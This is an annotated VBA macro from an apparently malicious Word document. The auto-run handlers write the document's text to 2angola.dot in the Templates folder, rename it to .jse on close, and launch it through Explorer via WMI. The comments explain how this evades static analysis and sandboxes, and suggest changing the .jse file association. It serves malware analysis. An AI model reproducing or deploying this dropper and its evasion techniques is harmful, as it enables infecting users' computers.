Private malFilePath As String ' String declaration containing the path of the malicious auto correct dictionary

Sub ExecuteMalware()
    newMalFilePath = Replace(malFilePath, ".dot", ".Jse") ' replaces the .dot in the string containing the path to the 2angola.dot file with .jse
    Name malFilePath As newMalFilePath ' Renames the malware file "C:\Users\<user>\AppData\Roaming\Microsoft\Templates\2angola.dot" to "C:\Users\<user>\AppData\Roaming\Microsoft\Templates\2angola.jse"
    Set p = GetObject("winmgmts:Win32_Process") ' Creates an object to start processes from vba
    res = p.Create("Explorer """ & newMalFilePath & """", Null, Null, pid) ' The string evaluates to 'Explorer "C:\Users\<user>\AppData\Roaming\Microsoft\Templates\2angola.jse"'
	' This will start the explorer to start the jse file. In most windows installations the jse file extension will be executed with the windows script host by default
	' By using only the Explorer to run the file, you can circumvent detection by static analysis. Calling "Wscript.exe" is way more obvious
	' Changing the default program to open jse files will protect you from this specific attack
End Sub

Private Function GetTemplateFilePath()
	' Reads the template path of the current document and appends "/2angola.dot" to it
	malFilePath = ActiveDocument.AttachedTemplate.Path & "\2angola.dot"
	GetTemplateFilePath = malFilePath ' return value
End Function

Private Sub saveFile(filename As String)
	' Creates a file with the passed file name
	ActiveDocument.SaveAs 	FileName:=filename, 
							FileFormat:=wdFormatText, ' This is where the /word/document.xml gets transformed to ascii only and stored on disk
							LockComments:=False, 
							Password:="", 
							AddToRecentFiles:=False,
							WritePassword:="",
							ReadOnlyRecommended:=False,
							EmbedTrueTypeFonts:=False,
							SaveNativePictureFormat:=False,
							SaveFormsData :=False,
							SaveAsAOCELetter:=False,
							InsertLineBreaks:= False,
							AllowSubstitutions:=False,
							LineEnding:=wdCRLF
End Sub

Private Sub Document_Close()
	' Will be executed when the word document is being closed
	' When closing the document the function fills the recently created files with malicious contents
	' This is where the infection starts taking place
	ExecuteMalware
End Sub

Private Sub Document_Open()
	' Will be executed when the word document is being opened
	saveFile GetTemplateFilePath ' Creates a text-only copy of document.xml with the name returned by the function "GetTemplateFilePath"
	saveFile GetTemplateFilePath & "u" ' Creates a text-only copy of document.xml with the name returned by the function "GetTemplateFilePath" and appends a "u" to it
	
	' Results are two new files were created:
	' C:\Users\<user>\AppData\Roaming\Microsoft\Templates\2angola.dot
	' C:\Users\<user>\AppData\Roaming\Microsoft\Templates\2angola.dotu
	
	' Until here nothing bad happened. The computer is not really infected by anything. Only two empty files were created.
	' If not executed manually until this point, the owner is "safe"
	' Only when the document will be closed those files will be executed. This is also one of the main reason why sandboxes 
	' do not detect this kind of vba very well, since most sandboxes won't close the document
End Sub